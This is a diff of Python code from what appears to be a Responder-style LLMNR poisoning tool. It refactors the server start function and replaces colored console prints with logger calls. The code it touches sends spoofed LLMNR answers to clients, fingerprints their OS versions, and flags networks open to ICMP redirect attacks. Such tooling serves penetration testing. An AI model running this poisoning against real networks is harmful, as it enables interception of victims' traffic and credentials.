@@ -26,17 +26,15 @@ from core.responder.odict import OrderedDict
 from SocketServer import BaseRequestHandler, ThreadingMixIn, UDPServer
 from core.responder.utils import *
 
-class LLMNR:
-
-    def start(self):
-        try:
-            server = ThreadingUDPLLMNRServer(('', 5355), LLMNRServer)
-            t = threading.Thread(name='LLMNR', target=server.serve_forever)
-            t.setDaemon(True)
-            t.start()
-        except Exception as e:
-            print "Error starting LLMNR server on port 5355"
-            print_exc()
+def start():
+    try:
+        server = ThreadingUDPLLMNRServer(('', 5355), LLMNRServer)
+        t = threading.Thread(name='LLMNR', target=server.serve_forever)
+        t.setDaemon(True)
+        t.start()
+    except Exception as e:
+        print "Error starting LLMNR server on port 5355"
+        print_exc()
 
 class ThreadingUDPLLMNRServer(ThreadingMixIn, UDPServer):
 
@@ -80,9 +78,9 @@ def IsICMPRedirectPlausible(IP):
             dnsip.extend(ip[1:])
     for x in dnsip:
         if x !="127.0.0.1" and IsOnTheSameSubnet(x,IP) == False:
-            print color("[Analyze mode: ICMP] You can ICMP Redirect on this network.", 5)
-            print color("[Analyze mode: ICMP] This workstation (%s) is not on the same subnet than the DNS server (%s)." % (IP, x), 5)
-            print color("[Analyze mode: ICMP] Use `python tools/Icmp-Redirect.py` for more details.", 5)
+            settings.Config.AnalyzeLogger.warning("[Analyze mode: ICMP] You can ICMP Redirect on this network.")
+            settings.Config.AnalyzeLogger.warning("[Analyze mode: ICMP] This workstation (%s) is not on the same subnet than the DNS server (%s)." % (IP, x))
+            settings.Config.AnalyzeLogger.warning("[Analyze mode: ICMP] Use `python tools/Icmp-Redirect.py` for more details.")
         else:
             pass
 
@@ -109,18 +107,15 @@ class LLMNRServer(BaseRequestHandler):
 
             # Analyze Mode
             if settings.Config.AnalyzeMode:
-                LineHeader = "[Analyze mode: LLMNR]"
-                print color("%s Request by %s for %s, ignoring" % (LineHeader, self.client_address[0], Name), 2, 1)
+                settings.Config.AnalyzeLogger.warning("[Analyze mode: LLMNR]{} Request by {} for {}, ignoring".format(self.client_address[0], Name))
 
             # Poisoning Mode
             else:
                 Buffer = LLMNR_Ans(Tid=data[0:2], QuestionName=Name, AnswerName=Name)
                 Buffer.calculate()
                 soc.sendto(str(Buffer), self.client_address)
-                LineHeader = "[*] [LLMNR]"
-
-                print color("%s  Poisoned answer sent to %s for name %s" % (LineHeader, self.client_address[0], Name), 2, 1)
+                settings.Config.PoisonersLogger.warning("[LLMNR] Poisoned answer sent to {} for name {}".format(self.client_address[0], Name))
 
             if Finger is not None:
-                print text("[FINGER] OS Version     : %s" % color(Finger[0], 3))
-                print text("[FINGER] Client Version : %s" % color(Finger[1], 3))
+                settings.Config.ResponderLogger.info("[FINGER] OS Version: {}".format(Finger[0]))
+                settings.Config.ResponderLogger.info("[FINGER] Client Version: {}".format(Finger[1]))
